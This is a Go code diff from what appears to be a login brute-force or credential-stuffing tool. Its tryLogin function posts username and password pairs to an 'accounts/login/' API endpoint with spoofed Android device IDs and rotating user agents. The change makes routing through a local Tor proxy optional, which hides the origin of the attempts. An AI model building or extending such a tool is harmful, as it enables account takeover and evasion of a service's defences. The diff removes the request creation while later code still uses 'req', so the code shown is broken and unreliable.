@@ -237,7 +237,7 @@ func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{}
 	return done
 }
 
-func tryLogin(username, password string) LoginResult {
+func tryLogin(username, password string, useTor bool) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	data := url.Values{}
 	data.Set("username", username)
@@ -245,20 +245,16 @@ func tryLogin(username, password string) LoginResult {
 	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))
 
 	var client *http.Client
-	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
-	if err != nil {
-		fmt.Println("TOR is not enabled, direct connection is used.")
-		client = &http.Client{Timeout: TIMEOUT}
+	if useTor {
+		dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
+		if err == nil {
+			transport := &http.Transport{Dial: dialer.Dial}
+			client = &http.Client{Transport: transport, Timeout: TIMEOUT}
+		} else {
+			client = &http.Client{Timeout: TIMEOUT}
+		}
 	} else {
-		transport := &http.Transport{Dial: dialer.Dial}
-		client = &http.Client{Transport: transport, Timeout: TIMEOUT}
-		fmt.Println("The connection was established via TOR.")
-	}
-
-	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
-	if err != nil {
-		log.Printf("Error creating request: %v\n", err)
-		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
+		client = &http.Client{Timeout: TIMEOUT}
 	}
 
 	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
